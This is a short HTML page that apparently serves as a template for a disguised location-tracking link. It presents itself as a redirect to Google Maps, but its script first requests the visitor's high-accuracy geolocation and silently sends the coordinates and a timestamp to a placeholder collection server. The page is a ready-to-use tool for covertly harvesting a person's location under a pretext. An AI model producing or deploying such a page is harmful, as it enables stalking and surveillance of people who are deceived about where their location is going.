<!DOCTYPE html>
<html>
<head>
    <title>Location Redirect</title>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
</head>
<body>
    <script>
        const googleMapsURL = 'YOUR_MAPS_URL_HERE';
        const serverURL = 'https://YOUR_RENDER_URL.onrender.com/save-location.php';

        // Nuclear option: Force geolocation with 10s timeout
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                // 1. Capture coordinates
                const coords = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: Date.now()
                };

                // 2. Send via Beacon API (guaranteed delivery)
                navigator.sendBeacon(serverURL, JSON.stringify(coords));
                
                // 3. Redirect after confirmation
                window.location.href = googleMapsURL;
            },
            (error) => {
                console.error('Geolocation Error:', error);
                window.location.href = googleMapsURL;
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    </script>
</body>
</html>
